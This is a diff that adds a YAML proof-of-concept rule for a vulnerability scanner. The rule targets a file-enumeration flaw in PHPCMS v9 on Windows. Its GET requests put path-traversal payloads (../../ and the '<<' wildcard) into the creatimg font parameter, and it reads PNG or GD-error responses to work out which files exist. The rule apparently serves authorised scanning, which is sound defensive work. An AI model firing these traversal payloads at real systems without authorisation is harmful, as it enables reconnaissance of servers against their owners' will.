@@ -1,0 +1,34 @@
+name: poc-yaml-phpcms-file-enum
+set:
+  r1: randomLowercase(8)
+rules:
+  - method: GET
+    path: >-
+      /api.php/?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/index.html
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type == "image/png" && response.body.bcontains(b"\x89PNG")
+  - method: GET
+    path: >-
+      /api.php/?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/iNdEx.HtmL
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type == "image/png" && response.body.bcontains(b"\x89PNG")
+  - method: GET
+    path: >-
+      /api.php/?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/inde<<
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type == "image/png" && response.body.bcontains(b"\x89PNG")
+  - method: GET
+    path: >-
+      /api.php/?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{{r1}}
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type == "image/png" && response.body.bcontains(b"Cannot Initialize new GD image stream")
+
+detail:
+  author: last0monster(https://github.com/last0monster)
+  effect_version: windows + phpcms v9
+  links:
+    - https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=35472&fromuid=229729?from=beef
